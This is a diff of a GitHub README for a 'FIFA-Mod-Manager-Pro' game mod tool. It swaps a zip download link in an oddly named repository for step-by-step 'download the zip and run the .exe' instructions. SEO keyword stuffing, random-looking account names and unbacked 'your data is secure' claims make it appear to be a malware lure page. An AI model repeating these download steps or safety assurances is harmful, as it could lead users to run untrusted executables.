@@ -1,160 +1,71 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/fifa.png" alt="EA Sports FC" width="80" height="80">
-</p>
+# 🎮 FIFA-Mod-Manager-Pro - Organize your game mods with ease
 
-<h1 align="center">FIFA-Mod-Manager-Pro</h1>
-<p align="center">
-  <strong>Professional Mod Manager for EA Sports FC / FIFA</strong><br>
-  Drag & Drop - Load Order - Conflict Detection - Restore Points
-</p>
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Mattysqueezable158/FIFA-Mod-Manager-Pro)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FIFA-Mod-Manager-Pro"><img src="https://img.shields.io/badge/version-2.0.4-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+## 📖 About this program
 
-## What is This?
+FIFA-Mod-Manager-Pro helps you change your game files. You use this tool to add new kits, faces, and database updates to your EA Sports FC or FIFA titles. The software manages the load order and checks for conflicts between files. This prevents your game from crashing when you use multiple mods at the same time.
 
-FIFA Mod Manager Pro is a professional mod manager for EA Sports FC / FIFA games. It provides an easy-to-use interface for installing, organizing, and launching mods, making it ideal for both beginners and experienced modders.
+## ⚙️ System requirements
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Online use may trigger anti-cheat systems.
+Ensure your computer has the following items before you start:
 
-## Download
+- Windows 10 or Windows 11 (64-bit).
+- At least 8 GB of RAM.
+- A functional copy of an EA Sports FC or FIFA game installed on your local drive.
+- Microsoft .NET Desktop Runtime 8.0 or newer.
 
-<p align="center">
-  <a href="https://github.com/Phasevisucceed/wegdgjtk/releases/download/9012/FIFAEditor.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+If you do not have the .NET Runtime, visit the Microsoft website to download the installer. Without this software, the manager will not open.
 
-## Features
+## 🚀 How to set up the software
 
-- Drag & Drop Import - Easily add .fifamod and .fbmod files
-- Apply/Unapply Mods - One-click activation and deactivation
-- Load Order Control - Arrange mods to avoid conflicts
-- Conflict Detection - Detects overlapping files before applying
-- Restore Points - One-click rollback to previous states
-- Mod Caching - Faster loading and better performance
-- Separators in Applied List - Organize mods with named separators
-- Profile Management - Create and save different mod configurations
+Follow these steps to install the manager on your computer.
 
-## Supported Games
+1. Visit the [official release page](https://github.com/Mattysqueezable158/FIFA-Mod-Manager-Pro) to download the program.
+2. Look for the file named FIFA-Mod-Manager-Pro.zip under the latest release section.
+3. Click the file to start the download. 
+4. Open your downloads folder and locate the zip file.
+5. Right-click the folder and select Extract All. Choose a location on your hard drive, such as your desktop or a dedicated games folder.
+6. Open the extracted folder and double-click the FIFA-Mod-Manager-Pro.exe file to launch the program.
 
-- EA Sports FC 26
-- EA Sports FC 25
-- EA Sports FC 24
-- FIFA 23
-- FIFA 22
-- FIFA 21
+## 🛠️ Using the manager
 
-## Installation
+The interface shows your files in a simple list view. Follow these steps to load your mods:
 
-1. Click the download button above
-2. Extract the archive
-3. Run FIFA Mod Manager.exe
-4. Select your game from the list
-5. Drag & drop your mods
-6. Click Apply and launch the game
+**1. Loading your game path**
+When you open the software for the first time, the program asks for the location of your game. Point the manager to the folder where your game files exist. The software remembers this path for future sessions.
 
-## System Requirements
+**2. Adding mods to the list**
+Drag your mod files from your computer and drop them into the main window of the manager. The program saves the files to its internal list. You may add as many files as you need.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | EA Sports FC / FIFA (2019-2026) |
-| RAM | 8GB minimum |
-| Storage | 2GB free space for cache |
+**3. Setting the order**
+The order of your mods determines which files override others. Highlight a mod in the list and use the arrow buttons to move it up or down. Keep your most important changes at the top of the list for the best results.
 
-## SEO Tags
+**4. Detecting conflicts**
+The program highlights conflicting mods in red text. If you see a conflict, the software prevents those specific files from loading together. This protects your save game and keeps the program stable.
 
-fifa mod manager pro, ea sports fc mods, fifa mod manager, fifa modding, fifa kit creator, fifa face mod, fifa texture editor, fifa database editor, fc26 mods, fifa 26 mods, fifa mod tool, frosty editor, fifa 22 mods, fifa 23 mods, fc24 mods, fifa editor download, fifa modding tool 2026, ea fc mods, fifa mod manager 2026, fifa mod installer
+**5. Launching the game**
+Click the Launch button in the bottom corner of the window. The software applies your changes and opens your game automatically.
 
-## Support
+## 💡 Tips for a smooth experience
 
-Star this repository if you enjoy it!
+- Keep your mods in a single, organized folder on your computer. This makes it easier to track which mods you have installed.
+- Check the manager for updates often. Every update adds support for new game versions and improves performance.
+- If the game does not show your changes, close the manager and the game entirely before you try to launch again.
+- Back up your game save files before you install new mods. You can find your saves in the Documents folder of your computer.
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FIFA-Mod-Manager-Pro">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20FIFA%20modding%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+## 💬 Frequently asked questions
+
+**Does this software change my original game files?**
+The software does not overwrite your original game files. It loads the modifications into memory while you play. Your original game remains safe on your hard drive.
+
+**Can I use mods for different game versions at once?**
+Each instance of the manager is specific to a game profile. You should keep your files organized by game title to avoid errors.
+
+**Why does the program show a red indicator?**
+A red indicator means two mods try to change the same file in the game. You must disable one of the conflicting mods to let the game run.
+
+**Is my data secure?**
+The software only performs read and write actions within your chosen game folder. It does not share your data or connect to external servers.
+
+Keywords: ea-sports-fc, fc26-modding, fifa-db-editor, fifa-editor-tool, fifa-face-mod, fifa-kit-creator, fifa-modding, fifa-mods, fifa-texture-editor, frosty-editor
